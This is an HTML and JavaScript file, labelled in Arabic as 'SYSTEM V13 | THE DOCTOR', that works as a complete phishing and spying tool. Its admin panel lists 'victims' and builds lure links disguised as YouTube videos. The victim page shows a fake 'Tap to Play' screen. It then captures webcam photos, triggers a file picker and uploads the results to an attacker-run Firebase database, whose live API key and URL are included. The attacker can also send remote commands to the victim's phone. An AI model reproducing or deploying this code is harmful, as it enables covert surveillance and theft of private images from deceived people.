<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM V13 | THE DOCTOR</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); margin: 0; font-family: sans-serif; overflow: hidden; }
        
        /* القائمة اليسرى */
        .hamburger { position: fixed; top: 15px; left: 15px; z-index: 1000; cursor: pointer; border: 1px solid var(--neon); padding: 5px 10px; background: #000; border-radius: 5px; }
        #menu-check { display: none; }
        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.3s; z-index: 999; padding: 60px 15px; overflow-y: auto; }
        #menu-check:checked ~ .sidebar { left: 0; }

        .main { height: 100vh; padding: 20px; overflow-y: auto; text-align: center; margin-top: 40px; }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; cursor: pointer; width: 100%; margin-bottom: 5px; font-weight: bold; }
        button:active { background: var(--neon); color: #000; }

        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; text-align: right; border-radius: 5px; }
        .v-card.active { border-color: #fff; background: #111; }
        .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; float: left; }

        /* المعرض */
        .img-box { border: 1px solid #444; margin-bottom: 15px; border-radius: 5px; overflow: hidden; }
        .img-box img { width: 100%; display: block; }
        .img-btns { display: flex; }
        .img-btns button { flex: 1; margin: 0; border-radius: 0; border: none; border-top: 1px solid #444; }

        /* واجهة الضحية المموّهة */
        #vic-ui { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items:center; justify-content:center; cursor: pointer; border: 2px solid #fff; }
        .play-btn::after { content: ''; border-left: 25px solid #fff; border-top: 15px solid transparent; border-bottom: 15px solid transparent; margin-left: 10px; }
    </style>
</head>
<body>

<input type="checkbox" id="menu-check">
<label for="menu-check" class="hamburger">☰ الأجهزة</label>

<div class="sidebar">
    <h3 style="border-bottom: 1px solid var(--neon);">📡 المتصلون الآن</h3>
    <div id="v-list">بانتظار الجلسات...</div>
    <hr>
    <h3>⚙️ مصنع الروابط</h3>
    <input type="text" id="target-vid" placeholder="رابط فيديو يوتيوب" style="width:100%; padding:10px; background:#000; color:var(--neon); border:1px solid var(--neon);">
    <button onclick="build()" style="margin-top:10px;">توليد الرابط</button>
    <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
</div>

<div class="main">
    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ التحكم: <span id="active-name">اختر ضحية</span></h3>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
        <button onclick="cmd('snap')">📸 سحب صورة</button>
        <button onclick="cmd('vibrate')" style="border-color:yellow;">📳 هز الهاتف</button>
        <button onclick="cmd('pick')" style="border-color:cyan;">📂 سحب ملفات</button>
        <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
    </div>
    <button onclick="clearAll()" style="border-color:red; color:red; margin-top:10px;">🗑️ مسح الجلسات</button>

    <div id="gallery" style="margin-top:20px; text-align:right;">
        <h4>🖼️ الملفات المستلمة:</h4>
        <div id="img-container"></div>
    </div>
</div>

<div id="vic-ui">
    <div id="initial-overlay">
        <div class="play-btn" onclick="startPayload()"></div>
        <p style="margin-top:20px; font-weight:bold;">انقر للتشغيل | Tap to Play</p>
    </div>
    <div id="loading-overlay" style="display:none;">
        <div style="width:40px; height:40px; border:4px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite;"></div>
        <p>جاري تحميل الفيديو...</p>
    </div>
    <input type="file" id="file-pick" style="display:none;" accept="image/*" multiple>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let currentId = null;

    // --- الآدمن ---
    db.ref('victims').on('value', s => {
        const list = document.getElementById('v-list');
        const container = document.getElementById('img-container');
        list.innerHTML = '';
        s.forEach(child => {
            const v = child.val();
            const id = child.key;
            const online = (Date.now() - v.lastSeen) < 10000;
            list.innerHTML += `<div class="v-card ${id==currentId?'active':''}" onclick="select('${id}','${v.model}')">
                <span class="dot" style="background:${online?'#0f0':'#f00'}"></span>
                <b>${v.model}</b><br><small>${v.time}</small>
            </div>`;

            if(id === currentId && v.files) {
                container.innerHTML = '';
                Object.keys(v.files).forEach(fId => {
                    container.innerHTML += `<div class="img-box">
                        <img src="${v.files[fId]}">
                        <div class="img-btns">
                            <button onclick="window.open('${v.files[fId]}')">حفظ</button>
                            <button onclick="db.ref('victims/${id}/files/${fId}').remove()" style="color:red">حذف</button>
                        </div>
                    </div>`;
                });
            }
        });
    });

    function select(id, model) { currentId = id; document.getElementById('active-name').innerText = model; document.getElementById('menu-check').checked = false; }
    function cmd(type) { if(currentId) db.ref('victims/'+currentId+'/cmd').set({ type, t: Date.now() }); }
    function build() { 
        const url = document.getElementById('target-vid').value;
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + btoa(url); 
    }
    function clearAll() { if(confirm("مسح الكل؟")) db.ref('/').remove(); }

    // --- الضحية (البايلوت) ---
    const params = new URLSearchParams(window.location.search);
    const vidUrl = params.get('v');
    let myRef = null;

    if(vidUrl) {
        document.getElementById('vic-ui').style.display = 'flex';
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
        myRef = db.ref('victims').push();
        myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);
    }

    async function startPayload() {
        document.getElementById('initial-overlay').style.display = 'none';
        document.getElementById('loading-overlay').style.display = 'flex';
        
        // تفعيل الهز (يحتاج لمسة المستخدم)
        navigator.vibrate(200);

        const snap = async () => {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const video = document.getElementById('v'); video.srcObject = s; await video.play();
                const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
                s.getTracks().forEach(t => t.stop());
            } catch(e) {}
        };

        await snap();

        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val();
            if(c) {
                if(c.type === 'snap') snap();
                if(c.type === 'vibrate') navigator.vibrate([300, 100, 300]);
                if(c.type === 'pick') document.getElementById('file-pick').click();
                if(c.type === 'release') window.location.href = atob(vidUrl);
            }
        });
    }

    document.getElementById('file-pick').onchange = (e) => {
        for(let f of e.target.files) {
            const r = new FileReader();
            r.onload = (ev) => myRef.child('files').push(ev.target.result);
            r.readAsDataURL(f);
        }
    };
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
